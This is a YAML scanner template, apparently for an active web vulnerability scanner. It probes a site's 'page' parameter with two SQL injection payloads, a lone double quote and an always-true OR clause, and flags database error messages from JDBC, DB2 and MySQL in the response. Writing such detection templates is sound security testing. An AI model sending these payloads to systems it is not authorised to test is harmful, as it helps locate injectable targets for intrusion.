id: sqli-generic-14
name: 'SQLi error generic via page'
severity: high
type: active
tags:
  - sqli
  - injection
  - generic
description: 'Triggers generic error via page'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      page:
        - '"'
        - '" OR "1"="1'
    matchers:
      - type: regex
        part: body
        regex:
          - 'JDBC'
          - 'DB2 SQL error'
          - 'Warning: mysql'
